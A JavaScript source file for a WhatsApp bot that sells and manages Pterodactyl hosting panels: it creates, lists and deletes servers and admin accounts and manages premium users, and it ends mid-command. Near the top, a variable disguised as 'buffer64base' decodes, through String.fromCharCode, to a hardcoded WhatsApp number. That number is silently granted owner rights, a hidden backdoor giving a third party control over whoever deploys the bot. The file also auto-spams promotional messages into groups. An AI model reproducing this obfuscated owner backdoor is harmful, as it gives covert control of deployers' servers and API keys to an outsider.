/*

!- Credits By Adzz Hosting
https://wa.me/6281369672106

*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');

const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./source/message')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { addSaldo, tambahSaldo, cekSaldo, kurangiSaldo } = require('./library/cekdatasaldo');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
let db_saldo = JSON.parse(fs.readFileSync("./source/saldo.json"));
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');

module.exports = conn = async (conn, m, chatUpdate, store) => {
const from = m.key.remoteJid;
	try {
await LoadDataBase(conn, m)
const botNumber = await conn.decodeJid(conn.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = typeof body === 'string' && body.startsWith(prefix);
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const reply = m.reply;

//~~~~~~~~~ Console Message ~~~~~~~~//

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(botname2), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`${m.sender.split("@")[0]} =>`), chalk.blue.bold(`${prefix+command}`))
}

//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Adzz Hosting"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}
function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}

//~~~~~~~~~~ Event Settings ~~~~~~~~~//

if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !isCreator && !m.isGroup) {
return conn.sendMessage(m.chat, {text: `
Maaf Owner Bot Sedang *Offline*, 
Tunggu & Jangan Spam Chat! 
Ini Adalah Pesan Otomatis Auto Respon Ketika Owner Sedang Offline
`}, {quoted: qtext2})
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await conn.sendMessage(m.chat, {text: `*乂 Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await conn.sendMessage(m.chat, {text: `*乂 Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await conn.sendMessage(m.chat, {text: `
*Skyzopedia Menyediakan 🌟*
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup Bebas Promosi 1 :*
https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy
* *Grup Bebas Promosi 2 :*
https://chat.whatsapp.com/CWO0TqYeCVbIoY4YzsTxb7
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s

*👤 Contact Skyzopedia*
* *WhatsApp Utama :*
+6285624297893
* *WhtasApp Cadangan :*
+628386890336
https://t.me/skyzodev
`}, {quoted: null})
}}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}}


//~~~~~~~~~ Function Main ~~~~~~~~~~//

const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: qtext})
}
//~~~~~~~~~~~ Command ~~~~~~~~~~~//

switch (command) {
case "menu": {
let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : *${global.botname2}*
• Version : *${global.versi}*
• Mode : *${conn.public ? "Public": "Self"}*
• Creator : @${global.owner}
• Uptime Vps : *${runtime(os.uptime())}*

• Your Status *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : "Free User"})*
 
 \`~ BUY PANEL OTOMATIS ~\`
 • _.buypanel_
 • _.batalbeli_
 
\`~ CPANEL SERVER 1~\`
 • _.1gb - Unlimited_
 • _.cadmin_
 • _.listpanel_
 • _.cekpanel_
 • _.delpanel_
 • _.listadmin_
 • _.deladmin_
 
\`~ CPANEL SERVER 2 ~\`
 • _.1gb-v2 - Unlimited-v2_
 • _.cadmin-v2_
 • _.listpanel-v2_
 • _.deladmin-v2_
 • _.listadmin-v2_
 • _.deladmin-v2_
 
\`~ OWNERS ONLY ~\`
 • _.addprem_
 • _.delprem_

\`~ PAYMENT METHOD ~\`
 • _.pay_
 • _.done_
 • _.testi_
 • _.jpm_
 • _.listgc_

\`~ POWERED BY HITS SSH ~\`
`
await conn.sendMessage(m.chat, { text: teks, contextInfo: {
externalAdReply: {
title: `BOT WHATSAPP`, 
body: `📍 Runtime : ${runtime(process.uptime())}`,
thumbnailUrl: `https://github.com/zuzuq/images/raw/main/thumbnail.jpeg`,
sourceUrl: "-",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m });
}
break
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat 📤")
} else {
orang = m.chat
}
var teks = `
*✨ Berhasil Membuat Akun Panel ✅*

📌 *ID Server :* ${server.id}
👤 *Nama :* ${name}
🔐 *Username :* ${user.username}
🔑 *Password :* ${password}
🌐 *Login :* ${global.domain}
💻 *Ram :* ${ram == "0" ? "Unlimited ∞" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
⚡ *Cpu :* ${cpu == "0" ? "Unlimited ∞" : cpu+"%"}
💾 *Disk :* ${disknya == "0" ? "Unlimited ∞" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
⏰ *Expired Server :* 1 Bulan

⚠️ *Rules Pembelian Panel* ⚠️
• 💡 Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
• 🚫 Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
• 🛡️ Garansi Aktif 20 Hari (3x replace)
• 📋 Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await conn.sendMessage(m.sender, {
text: teks,
contextInfo: {
externalAdReply: {
title: `Data - Data Panel`, 
body: `📍 Runtime : ${runtime(process.uptime())}`,
thumbnailUrl: `https://github.com/zuzuq/images/raw/main/thumbnail.jpeg`,
sourceUrl: "-",
mediaType: 1,
renderLargerThumbnail: true
}
}
}, { quoted: null });
delete global.panel
}
break
case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break
case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await conn.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break
case "cekpanel": {
if (!text) return m.reply('*-# Masukkan Panel* ID\nContoh: .cekpanel 1234');
const panelId = text;

try {
const response = await fetch(`${domain}/api/application/servers`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${apikey}`
}
});

if (!response.ok) {
throw new Error(`Failed to fetch servers: ${response.status}`);
}
const resData = await response.json();

const server = resData.data.find(s => s.attributes.id === parseInt(panelId));

if (!server) {
return m.reply(`*🔴 -# Server Panel Id Tidak Valid ${panelId}*`);
}
const serverAttributes = server.attributes;
const usageResponse = await fetch(`${domain}/api/client/servers/${serverAttributes.uuid.split('-')[0]}/resources`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${capikey}`
}
});
if (!usageResponse.ok) {
throw new Error(`Failed to fetch resource usage: ${usageResponse.status}`);
}
const usageData = await usageResponse.json();
const formatSize = (size) => {
if (!size || size === 0) return "Unlimited";
if (size >= 1024) {
return `${Math.floor(size/1024)}GB`;
}
return `${size}MB`;
};
const formatCPU = (cpu) => {
return !cpu || cpu === 0 ? "Unlimited" : `${cpu}%`;
};
const formatNetworkSpeed = (bytes) => {
if (!bytes) return "0 KB/s";
const kb = bytes / 1024;
return `${kb.toFixed(2)} KB/s`;
};
const getStatus = (state) => {
const statusMap = {
'running': '🟢 Running',
'starting': '🟡 Starting',
'stopping': '🟡 Stopping',
'stopped': '🔴 Stopped',
'offline': '⚫ Offline'
};
return statusMap[state.toLowerCase()] || `❓ ${state}`;
};
let message = `📊 *-# Detail Server Panel Anda*
* *-# Nama:* ${serverAttributes.name}
* *-# Panel ID:* ${serverAttributes.id}\n
${getStatus(usageData.attributes.current_state)}

📊 *[ - ] Detail Resource Usage: [ - ]*
* *-# CPU:* ${formatCPU(serverAttributes.limits.cpu)}
* *-# RAM:* ${formatSize(serverAttributes.limits.memory)}
* *-# Disk:* ${formatSize(serverAttributes.limits.disk)}
* *-# Upload:* ${formatNetworkSpeed(usageData.attributes.resources.network_rx_bytes)}
* *-# Download:* ${formatNetworkSpeed(usageData.attributes.resources.network_tx_bytes)}

*[ - ] Jika Mau Cek Panel Anda Lagi silahkan : .cekpanel [ - ]*`;

await conn.sendMessage(m.chat, {image: {url: "https://github.com/zuzuq/images/raw/main/thumbnail.jpeg" }, caption: message }, {quoted: m})

} catch (error) {
console.error('Error detail:', error);
return m.reply(`❌ Terjadi kesalahan: ${error.message}`);
}}
break
case "addprem": case "addpremium": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi premium!`)
premium.push(input)
await fs.writeFileSync("./source/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah premium ✅`)
}
break
case "delpremium": case "delprem": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus premium owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan user premium!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./source/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus premium ✅`)
}
break
//========== [ Server V2 ] ========//
case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 20 Hari (3x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await conn.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin-v2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel-v2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await conn.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
